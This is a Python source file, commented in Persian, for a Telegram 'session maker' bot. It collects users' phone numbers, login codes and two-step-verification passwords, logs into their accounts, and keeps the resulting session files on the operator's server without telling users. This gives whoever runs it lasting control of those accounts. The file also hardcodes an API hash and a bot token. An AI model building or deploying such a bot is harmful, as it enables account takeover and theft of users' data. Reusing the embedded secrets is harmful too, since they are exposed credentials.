import os
import sys
import asyncio
import re
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

# ==================== تنظیمات اولیه ====================
API_ID = 34855392
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"
BOT_TOKEN = "8692323102:AAHVQ5sxZjQk81D8YN5QNItQXMt25vurXqQ"

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ ERROR: Missing required values!")
    sys.exit(1)

print(f"✅ API_ID: {API_ID}")
print(f"✅ API_HASH: {API_HASH[:10]}...")
print(f"✅ BOT_TOKEN: {BOT_TOKEN[:10]}...")

# دیکشنری برای ذخیره وضعیت کاربران
user_sessions = {}

# ==================== بخش HTTP Server ====================
try:
    from aiohttp import web
    
    async def health_check(request):
        return web.Response(text="✅ Bot is running!", status=200)
    
    async def run_web_server():
        port = int(os.environ.get("PORT", 8080))
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        print(f"🌐 Web server running on port {port}")
        while True:
            await asyncio.sleep(3600)
    
except ImportError:
    print("⚠️ aiohttp not installed. Web server disabled.")
    async def run_web_server():
        port = int(os.environ.get("PORT", 8080))
        print(f"⚠️ Web server not available, but port {port} is configured.")
        while True:
            await asyncio.sleep(3600)

# ==================== کلاس اصلی ربات ====================
class SessionBot:
    def __init__(self):
        self.bot = TelegramClient(
            'session_bot',
            API_ID,
            API_HASH,
            device_model="Windows 11",
            system_version="Windows 11",
            app_version="Telegram Desktop",
            lang_code="en",
            system_lang_code="en-US"
        )
        self.temp_clients = {}

    def validate_code_format(self, code):
        """
        بررسی فرمت کد:
        - فقط باید شامل اعداد باشد
        - بدون فاصله، نقطه یا هر کاراکتر دیگر
        """
        # اگر خالی باشد
        if not code:
            return False, "کد نمی‌تواند خالی باشد."
        
        # اگر شامل فاصله باشد
        if ' ' in code:
            return False, "❌ فرمت کد صحیح نیست. لطفاً کد را بدون فاصله ارسال کنید."
        
        # اگر شامل نقطه باشد
        if '.' in code:
            return False, "❌ فرمت کد صحیح نیست. لطفاً کد را بدون نقطه ارسال کنید."
        
        # اگر شامل کاراکتر غیرعددی باشد
        if not code.isdigit():
            return False, "❌ فرمت کد صحیح نیست. لطفاً فقط از اعداد استفاده کنید."
        
        return True, code

    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("🤖 ربات راه‌اندازی شد!")
        me = await self.bot.get_me()
        print(f"✅ ربات با نام @{me.username} آماده است!")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_command(event):
            user_id = event.sender_id
            session_name = f"user_{user_id}"
            session_path = os.path.expanduser(f"~/sessions/{session_name}")
            
            client = TelegramClient(
                session_path,
                API_ID,
                API_HASH,
                device_model="Windows 11",
                system_version="Windows 11",
                app_version="Telegram Desktop",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            self.temp_clients[user_id] = {
                'client': client,
                'session_path': session_path,
                'session_name': session_name,
                'step': 'phone',  # phone, code, 2fa
                'phone': None,
                'phone_code_hash': None,
                'code': '',  # کد پاکسازی شده
            }
            
            await event.respond(
                "👋 به ربات ساخت سشن خوش آمدید!\n\n"
                "📱 لطفاً شماره تلفن خود را با کد کشور وارد کنید.\n"
                "مثال: +989123456789"
            )

        @self.bot.on(events.NewMessage)
        async def handle_messages(event):
            if event.is_private and event.text and not event.text.startswith('/'):
                user_id = event.sender_id
                
                if user_id not in self.temp_clients:
                    await event.respond("❗ لطفاً ابتدا /start را بزنید.")
                    return
                
                user_data = self.temp_clients[user_id]
                step = user_data['step']
                client = user_data['client']
                
                try:
                    if step == 'phone':
                        # دریافت شماره تلفن
                        phone = event.text.strip()
                        
                        # اتصال به کلاینت
                        await client.connect()
                        
                        if not await client.is_user_authorized():
                            try:
                                # ارسال درخواست کد
                                send_result = await client.send_code_request(phone)
                                user_data['phone'] = phone
                                user_data['step'] = 'code'
                                user_data['phone_code_hash'] = send_result.phone_code_hash
                                
                                await event.respond(
                                    "✅ کد تأیید به شماره شما ارسال شد.\n\n"
                                    "📝 لطفاً کد احراز هویت را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
                                    "مثال صحیح: `12345`\n\n"
                                    "⚠️ فرمت‌های زیر **غیرمجاز** هستند:\n"
                                    "• `1 2 3 4 5` (با فاصله)\n"
                                    "• `1.2.3.4.5` (با نقطه)"
                                )
                                
                            except Exception as e:
                                await event.respond(f"❌ خطا در ارسال کد: {str(e)}")
                        else:
                            await event.respond("⚠️ این شماره قبلاً تأیید شده است!")
                    
                    elif step == 'code':
                        # دریافت کد احراز هویت
                        raw_code = event.text.strip()
                        
                        # بررسی فرمت کد
                        is_valid, message = self.validate_code_format(raw_code)
                        
                        if not is_valid:
                            # نمایش خطا و راهنمایی مجدد
                            await event.respond(
                                f"{message}\n\n"
                                "📝 لطفاً کد را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
                                "مثال صحیح: `12345`"
                            )
                            return
                        
                        # کد معتبر است
                        user_data['code'] = raw_code  # ذخیره به صورت string
                        
                        # تأیید کد
                        await self.verify_code(event, user_data)
                    
                    elif step == '2fa':
                        # دریافت رمز 2FA
                        raw_password = event.text.strip()
                        
                        # بررسی فرمت رمز (می‌تواند شامل حروف و اعداد باشد)
                        if not raw_password:
                            await event.respond(
                                "❌ رمز عبور نمی‌تواند خالی باشد.\n"
                                "لطفاً رمز عبور دو مرحله‌ای خود را وارد کنید:"
                            )
                            return
                        
                        user_data['code'] = raw_password
                        
                        # تأیید رمز 2FA
                        await self.verify_2fa(event, user_data)
                
                except Exception as e:
                    error_msg = str(e)
                    # بررسی خطاهای خاص
                    if "FLOOD" in error_msg:
                        await event.respond("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.")
                    else:
                        await event.respond(f"❌ خطای غیرمنتظره: {error_msg}")

        await self.bot.run_until_disconnected()

    async def verify_code(self, event, user_data):
        """
        تأیید کد ورود با استفاده از روش صحیح Telethon
        """
        code = user_data['code']  # string
        phone = user_data['phone']
        client = user_data['client']
        phone_code_hash = user_data.get('phone_code_hash')
        
        try:
            # روش صحیح تأیید کد در Telethon
            if phone_code_hash:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            else:
                await client.sign_in(phone, code)
            
            # موفقیت
            await self.handle_successful_login(event, user_data)
                
        except SessionPasswordNeededError:
            # نیاز به رمز 2FA
            user_data['step'] = '2fa'
            await event.respond(
                "🔐 این حساب دارای رمز عبور دو مرحله‌ای است.\n\n"
                "لطفاً رمز عبور خود را وارد کنید:"
            )
            
        except PhoneCodeInvalidError:
            # کد اشتباه
            user_data['code'] = ''
            await event.respond(
                "❌ کد وارد شده اشتباه است!\n\n"
                "📝 لطفاً کد را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
                "مثال صحیح: `12345`"
            )
            
        except PhoneCodeExpiredError:
            # کد منقضی شده
            await event.respond(
                "❌ کد منقضی شده است.\n\n"
                "لطفاً دوباره /start را بزنید و شماره خود را مجدداً وارد کنید."
            )
            del self.temp_clients[event.sender_id]
            
        except Exception as e:
            error_msg = str(e)
            # بررسی خطاهای خاص
            if "PHONE_CODE_INVALID" in error_msg:
                user_data['code'] = ''
                await event.respond(
                    "❌ کد وارد شده اشتباه است!\n\n"
                    "📝 لطفاً کد را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
                    "مثال صحیح: `12345`"
                )
            elif "FLOOD" in error_msg:
                await event.respond("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.")
            else:
                await event.respond(f"❌ خطا: {error_msg}")

    async def verify_2fa(self, event, user_data):
        """
        تأیید رمز 2FA با استفاده از روش صحیح Telethon
        """
        password = user_data['code']
        client = user_data['client']
        
        try:
            # روش صحیح تأیید رمز 2FA در Telethon
            await client.sign_in(password=password)
            
            # موفقیت
            await self.handle_successful_login(event, user_data)
                
        except Exception as e:
            error_msg = str(e)
            if "PASSWORD_HASH_INVALID" in error_msg or "SRP_ID_INVALID" in error_msg:
                user_data['code'] = ''
                await event.respond(
                    "❌ رمز عبور اشتباه است!\n\n"
                    "لطفاً رمز عبور دو مرحله‌ای خود را مجدداً وارد کنید:"
                )
            else:
                await event.respond(f"❌ خطا: {error_msg}")

    async def handle_successful_login(self, event, user_data):
        """
        مدیریت ورود موفق: ارسال فایل سشن و پاکسازی داده‌ها
        """
        await event.respond("✅ تأیید با موفقیت انجام شد!")
        
        # ارسال فایل سشن
        session_file = user_data['session_path'] + ".session"
        
        if os.path.isfile(session_file):
            client = user_data['client']
            
            try:
                # ارسال به Saved Messages
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                # ارسال به ربات
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                await event.respond(
                    "✅ عملیات با موفقیت انجام شد!\n\n"
                    "📁 فایل سشن به Saved Messages و اینجا ارسال شد."
                )
                
            except Exception as e:
                await event.respond(f"❌ خطا در ارسال فایل: {str(e)}")
        else:
            await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
        
        # پاک کردن داده‌های موقت
        if event.sender_id in self.temp_clients:
            del self.temp_clients[event.sender_id]

# ==================== اجرای اصلی ====================
async def main():
    os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
    bot = SessionBot()
    
    try:
        bot_task = asyncio.create_task(bot.start())
        web_task = asyncio.create_task(run_web_server())
        
        done, pending = await asyncio.wait(
            [bot_task, web_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        
        for task in pending:
            task.cancel()
            
    except KeyboardInterrupt:
        print("\n🛑 ربات متوقف شد.")
    except Exception as e:
        print(f"❌ خطا: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 برنامه با Ctrl+C متوقف شد.")
    except Exception as e:
        print(f"❌ خطای اجرا: {e}")
        sys.exit(1)
